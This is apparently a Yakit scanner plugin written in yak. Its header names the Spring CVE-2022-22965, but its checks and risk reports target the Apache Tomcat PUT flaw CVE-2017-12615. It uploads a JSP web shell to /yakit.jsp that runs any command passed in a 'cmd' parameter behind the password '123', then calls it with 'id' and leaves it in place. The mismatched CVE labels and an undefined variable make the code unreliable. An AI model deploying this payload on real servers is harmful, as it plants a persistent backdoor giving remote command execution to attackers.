# port scan plugin
log.setLevel("info")
yakit.AutoInitYakit()
//SpringFrameworkJDK>=9_CVE-2022-22965远程代码执行漏洞检测
//SpringFrameworkJDK>=9_CVE-2022-22965远程代码执行漏洞检测.yak

handleCheck1 = func(target, port){
    addr1 = str.HostPort(target, port)
    isTls1 = str.IsTLSServer(addr1)

    packet1 = `
PUT /yakit.jsp/ HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0

<%
    if("123".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;          
        byte[] b = new byte[1024];          
        out.print("<pre>");          
        while((a=in.read(b))!=-1){
            out.println(new String(b));          
        }
        out.print("</pre>");
    } 
%>`
    _,_,_ = poc.HTTP(packet1, 
    poc.params({"target":addr1}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    return

}

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET /yakit.jsp?&pwd=123&cmd=id HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0
`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        println(string(rsp))
        if str.MatchAllOfSubString(rsp, `uid=`) && str.MatchAllOfSubString(rsp, `HttpOnly`){
            yakit.Info("%v found ApacheTomcatPUT_CVE-2017-12615远程命令执行漏洞", addr)
            risk.NewRisk(
            addr,risk.title("ApacheTomcatPUT_CVE-2017-12615远程命令执行漏洞"),
            risk.severity("high"),
            risk.titleVerbose("ApacheTomcatPUT_CVE-2017-12615远程命令执行漏洞存在"),
            risk.type("RCE[Apache Tomcat]"),
            risk.payload(`/yakit.jsp`),
            risk.request(string(req)),
            risk.response(string(rsp)),
        )
        }else{
            println("不存在ApacheTomcatPUT_CVE-2017-12615远程命令执行漏洞")
            }
       
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck1(result.Target,result.Port)
        handleCheck(result.Target,result.Port)
    }
    
}